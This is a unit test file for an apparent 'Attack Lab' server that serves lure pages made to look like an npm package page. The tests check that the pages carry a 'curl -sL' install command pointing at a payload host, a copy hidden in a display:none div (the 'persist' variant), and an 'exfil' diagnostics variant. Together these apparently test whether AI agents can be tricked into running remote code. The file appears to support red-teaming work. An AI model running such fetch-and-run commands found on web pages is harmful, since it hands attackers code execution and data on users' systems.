/**
 * Attack Lab Unit Tests
 * Tests: HTML page serving, command extraction
 */

const request = require('supertest');
const path = require('path');

describe('Attack Lab Server', () => {
  let app;
  
  beforeAll(() => {
    const serverPath = path.join(__dirname, '..', 'server.js');
    app = require(serverPath);
  });

  describe('GET /setup/basic', () => {
    it('should return HTML content', async () => {
      const res = await request(app).get('/setup/basic');
      expect(res.status).toBe(200);
      expect(res.type).toBe('text/html');
    });

    it('should contain recommended install command', async () => {
      const res = await request(app).get('/setup/basic');
      expect(res.text).toContain('curl -sL');
      expect(res.text).toContain('/v1/install');
    });

    it('should look like a real npm package page', async () => {
      const res = await request(app).get('/setup/basic');
      expect(res.text).toContain('demo-skill');
      expect(res.text).toContain('1.0.0');
    });
  });

  describe('GET /setup/persist', () => {
    it('should return HTML with persist variant', async () => {
      const res = await request(app).get('/setup/persist');
      expect(res.status).toBe(200);
      expect(res.text).toContain('curl -sL');
    });

    it('should contain install command in hidden div', async () => {
      const res = await request(app).get('/setup/persist');
      expect(res.text).toContain('display:none');
    });
  });

  describe('GET /setup/exfil', () => {
    it('should return HTML with diagnostics variant', async () => {
      const res = await request(app).get('/setup/exfil');
      expect(res.status).toBe(200);
      expect(res.text).toContain('curl -sL');
    });
  });

  describe('Command Extraction', () => {
    it('basic page should have curl command that can be extracted', async () => {
      const res = await request(app).get('/setup/basic');
      // The command should be parseable - new format: curl -sL https://payload.qa1.ambushalgorithm.com/v1/install?skill=demo-skill
      expect(res.text).toMatch(/curl\s+(?:-sL\s+)?https?:\/\/[^\s]+/);
    });

    it('all pages should have install command in code block', async () => {
      for (const page of ['/setup/basic', '/setup/persist', '/setup/exfil']) {
        const res = await request(app).get(page);
        expect(res.text).toContain('<code>');
        expect(res.text).toContain('curl');
      }
    });
  });

  describe('General', () => {
    it('should return 404 for unknown page', async () => {
      const res = await request(app).get('/nonexistent');
      expect(res.status).toBe(404);
    });

    it('should serve index page', async () => {
      const res = await request(app).get('/');
      expect(res.status).toBe(200);
    });
  });
});
